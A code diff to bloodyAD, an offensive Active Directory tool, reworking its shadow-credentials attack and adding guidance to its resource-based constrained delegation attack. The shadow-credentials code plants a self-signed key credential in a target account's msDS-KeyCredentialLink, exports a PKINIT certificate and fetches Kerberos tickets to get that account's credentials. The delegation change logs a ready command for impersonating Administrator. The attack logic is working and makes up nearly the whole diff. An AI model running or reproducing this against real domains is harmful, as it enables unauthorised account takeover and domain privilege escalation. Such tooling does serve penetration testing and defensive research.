@@ -1,16 +1,14 @@
-import binascii, datetime, random, string, base64
+import binascii, random, string, base64
 from typing import Literal
 from urllib import parse
 from bloodyAD import utils, ConnectionHandler
 from bloodyAD.exceptions import LOG
-from bloodyAD.formatters import accesscontrol, common, cryptography, dns
+from bloodyAD.formatters import accesscontrol, dns
 from bloodyAD.network.ldap import Change, Scope
 from bloodyAD.exceptions import BloodyError
 from bloodyAD.cli_modules import set as bloodySet
 import badldap
-from cryptography import x509
-from cryptography.hazmat.primitives import hashes, serialization
-from cryptography.hazmat.primitives.asymmetric import rsa
+from badldap.commons.keycredential import KeyCredential
 from kerbad.common import factory
 from kerbad.common.spn import KerberosSPN
 from kerbad.common.kirbi import Kirbi
@@ -493,6 +491,9 @@ async def rbcd(conn: ConnectionHandler, target: str, service: str):
     )
 
     LOG.info(f"{service} can now impersonate users on {target} via S4U2Proxy")
+    splitted_url = ldap.co_url.split("-",1)    
+    url = "kerberos+" + splitted_url[1]
+    LOG.info(f"e.g. badS4U2proxy '{url}' 'HOST/{target}@{conn.conf.domain}' 'Administrator@{conn.conf.domain}'")
 
 
 async def shadowCredentials(conn: ConnectionHandler, target: str, path: str = "CurrentPath", stealth: bool = False):
@@ -523,8 +524,8 @@ async def shadowCredentials(conn: ConnectionHandler, target: str, path: str = "C
             if not new_conn:
                 return
 
-    target_dn = None
-    target_sAMAccountName = None
+    target_dn = ""
+    target_sAMAccountName = ""
     async for entry in ldap.bloodysearch(target, attr=["distinguishedName", "sAMAccountName"]):
         target_dn = entry["distinguishedName"]
         target_sAMAccountName = entry["sAMAccountName"]
@@ -533,57 +534,36 @@ async def shadowCredentials(conn: ConnectionHandler, target: str, path: str = "C
             random.choice(string.ascii_letters + string.digits) for i in range(2)
         )
 
-    LOG.debug("Generating certificate")
-
-    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
-    subject = x509.Name.from_rfc4514_string(target_dn)
-    cert = (
-        x509.CertificateBuilder()
-        .subject_name(subject)
-        .issuer_name(subject)
-        .serial_number(x509.random_serial_number())
-        .public_key(key.public_key())
-        .not_valid_before(datetime.datetime.utcnow())
-        .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
-        .sign(key, hashes.SHA256())
-    )
-
     LOG.debug("Generating KeyCredential")
-
-    keyCredential = cryptography.KEYCREDENTIALLINK_BLOB()
-    keyCredential.keyCredentialLink_from_x509(cert)
-
+    keyCredential = KeyCredential.generate_self_signed_certificate(target_dn)
+    
     LOG.info(
         "KeyCredential generated with following sha256 of RSA key: %s"
-        % binascii.hexlify(keyCredential.getKeyID()).decode()
+        % binascii.hexlify(keyCredential.getKeyIdentifier()[1]).decode()
     )
 
     LOG.debug("Updating the msDS-KeyCredentialLink attribute of %s" % target)
 
-    key_dnbinary = common.DNBinary()
-    key_dnbinary.fromCanonical(keyCredential.getData(), target_dn)
-    await ldap.bloodymodify(
-        target_dn,
-        {"msDS-KeyCredentialLink": [(Change.ADD.value, str(key_dnbinary))]},
-    )
+    current_keys, err = await ldap.get_keycredentiallink(target_dn)
+    if err is not None:
+        raise err
+    if current_keys is None:
+        current_keys = []
+    LOG.debug(f"Current KeyCredentials on target: {current_keys}")
+    current_keys.append(keyCredential.toDNWithBinary2String(target_dn))
+    _, err = await ldap.set_keycredentiallink(target_dn, current_keys)
+    if err is not None:
+        raise err
 
     LOG.debug("msDS-KeyCredentialLink attribute of the target object updated")
 
-    pfx = serialization.pkcs12.serialize_key_and_certificates(
-        name=target_dn.encode(),
-        key=key,
-        cert=cert,
-        cas=None,
-        encryption_algorithm=serialization.NoEncryption(),
-    )
     if stealth:
+        keyCredential.to_pfx(path)
         pfx_path = path + ".pfx"
-        with open(pfx_path, "wb") as f:
-            f.write(pfx)
         LOG.info(f"PKINIT PFX certificate saved at: %s" % pfx_path)
         LOG.info(f"You can now obtain a TGT by doing badNTPKInit 'kerberos+pfx://{conn.conf.domain}\\{target_sAMAccountName}@{conn.conf.dcip}/?certdata={pfx_path}'")
     else:
-        pfx_base64 = parse.quote(base64.b64encode(pfx).decode('utf-8'), safe="")
+        pfx_base64 = parse.quote(base64.b64encode(keyCredential.to_pfx_data()).decode('utf-8'), safe="")
         client = None
         try:
             url = f"kerberos+pfxstr://{conn.conf.domain}\\{target_sAMAccountName}@{conn.conf.dcip}/?certdata={pfx_base64}&timeout=350"
@@ -591,9 +571,8 @@ async def shadowCredentials(conn: ConnectionHandler, target: str, path: str = "C
             client = cu.get_client_blocking()
             tgs, enctgs, key, decticket = client.with_clock_skew(client.U2U)
         except Exception as e:
+            keyCredential.to_pfx(path)
             pfx_path = path + ".pfx"
-            with open(pfx_path, "wb") as f:
-                f.write(pfx)
             LOG.error(f"PKINIT failed on DC {conn.conf.dcip}, you must find a Kerberos server with a certification authority!")
             LOG.error(f"Retry on a working KDC and do:\nbadNTPKInit 'kerberos+pfx://{conn.conf.domain}\\{target_sAMAccountName}@{conn.conf.dcip}/?certdata={pfx_path}&timeout=350'")
             LOG.info(f"PKINIT PFX certificate saved at: %s" % pfx_path)
